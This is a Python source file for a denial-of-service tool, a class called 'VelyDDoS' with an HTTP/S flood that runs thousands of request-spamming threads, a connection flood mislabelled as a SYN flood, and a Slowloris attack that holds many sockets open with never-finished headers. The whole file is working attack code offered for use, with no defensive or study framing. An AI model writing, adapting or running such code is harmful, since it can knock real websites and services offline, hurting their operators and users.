import threading
import socket
import random
import requests
import ssl
import time
from concurrent.futures import ThreadPoolExecutor

class VelyDDoS:
    def __init__(self):
        self.active_attacks = []
        self.user_agent_pool = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'VELY-DDOS/2.0 (Gxyenn-Official)'
        ]
    
    def http_flood(self, target_url, threads=5000):
        """HTTP/S Flood Attack"""
        def attack():
            while True:
                try:
                    headers = {'User-Agent': random.choice(self.user_agent_pool)}
                    requests.get(target_url, headers=headers, timeout=1)
                    requests.post(target_url, data={'attack':'vely'}, headers=headers)
                except:
                    pass
        
        for _ in range(threads):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            thread.start()
            self.active_attacks.append(thread)
    
    def syn_flood(self, target_ip, target_port=80):
        """SYN Flood Attack"""
        def syn_attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target_ip, target_port))
                    s.send(b'GET / HTTP/1.1\r\n\r\n')
                except:
                    s.close()
        
        for _ in range(20000):
            threading.Thread(target=syn_attack).start()
    
    def slowloris(self, target_url, sockets=10000):
        """Slowloris Attack Implementation"""
        headers = "GET / HTTP/1.1\r\n"
        headers += "Host: " + target_url.replace('http://', '').replace('https://', '') + "\r\n"
        headers += "User-Agent: VELY-DDOS\r\n"
        headers += "Content-Length: 1000000\r\n"
        
        sock_list = []
        for _ in range(sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_url, 80))
                s.send(headers.encode())
                sock_list.append(s)
            except:
                pass
        
        while True:
            for s in sock_list:
                try:
                    s.send(b"X-a: b\r\n")
                except:
                    sock_list.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target_url, 80))
                        s.send(headers.encode())
                        sock_list.append(s)
                    except:
                        pass
            time.sleep(10)